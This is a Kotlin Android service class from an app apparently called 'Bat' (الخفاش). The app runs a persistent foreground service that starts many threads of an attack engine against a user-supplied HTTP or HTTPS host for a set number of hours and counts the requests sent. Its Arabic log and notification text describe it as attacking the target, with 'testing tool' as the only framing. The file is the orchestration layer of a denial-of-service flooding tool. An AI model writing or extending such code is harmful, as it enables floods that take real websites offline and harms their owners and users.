package com.alrufaaey.batapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Binder
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicLong

class AttackService : Service() {

    private val binder = LocalBinder()
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val threadPool = Executors.newCachedThreadPool()

    private val _isAttacking = MutableStateFlow(false)
    val isAttacking: StateFlow<Boolean> = _isAttacking

    private val _totalRequests = MutableStateFlow(0L)
    val totalRequests: StateFlow<Long> = _totalRequests

    private val _logMessages = MutableSharedFlow<String>(extraBufferCapacity = 100)
    val logMessages: SharedFlow<String> = _logMessages

    private val totalRequestsCounter = AtomicLong(0)
    private val activeEngines = mutableListOf<AttackEngine>()
    private var autoStopJob: Job? = null

    companion object {
        private const val CHANNEL_ID = "bat_attack_channel"
        private const val NOTIFICATION_ID = 1
    }

    inner class LocalBinder : Binder() {
        fun getService(): AttackService = this@AttackService
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification("جاهز للعمل"))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    fun startAttack(target: String, isHttps: Boolean, threads: Int, hours: Int) {
        if (_isAttacking.value) return

        totalRequestsCounter.set(0)
        _totalRequests.value = 0
        activeEngines.clear()
        _isAttacking.value = true

        val cleanTarget = target.removePrefix("https://").removePrefix("http://").trimEnd('/')
        log("بدء الهجوم على: $cleanTarget | خيوط: $threads | مدة: $hours ساعة")
        updateNotification("يهاجم: $cleanTarget | طلبات: 0")

        repeat(threads) {
            val engine = AttackEngine(
                host = cleanTarget,
                isHttps = isHttps,
                onRequestSent = { count ->
                    _totalRequests.value = count
                    if (count % 1000 == 0L) {
                        updateNotification("يهاجم: $cleanTarget | طلبات: ${String.format("%,d", count)}")
                    }
                },
                onLog = { message -> log(message) }
            )
            activeEngines.add(engine)
            threadPool.submit {
                while (engine.running.get()) {
                    try {
                        if (isHttps) engine.runHttpsAttack() else engine.runHttpAttack()
                    } catch (e: Exception) {
                        log("خطأ في الخيط: ${e.message}")
                    }
                    if (engine.running.get()) Thread.sleep(100)
                }
            }
        }

        if (hours > 0) {
            autoStopJob = serviceScope.launch {
                delay(hours * 3600 * 1000L)
                stopAttack()
                log("توقف تلقائي بعد $hours ساعة")
            }
        }
    }

    fun stopAttack() {
        autoStopJob?.cancel()
        activeEngines.forEach { it.stop() }
        activeEngines.clear()
        _isAttacking.value = false
        log("تم إيقاف الهجوم")
        updateNotification("متوقف")
    }

    private fun log(message: String) {
        serviceScope.launch {
            _logMessages.emit("[${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}] $message")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "خدمة الخفاش",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "خدمة الهجوم في الخلفية"
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(status: String): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("الخفاش - أداة الاختبار")
            .setContentText(status)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(status: String) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify(NOTIFICATION_ID, buildNotification(status))
    }

    override fun onDestroy() {
        stopAttack()
        serviceScope.cancel()
        threadPool.shutdown()
        super.onDestroy()
    }
}
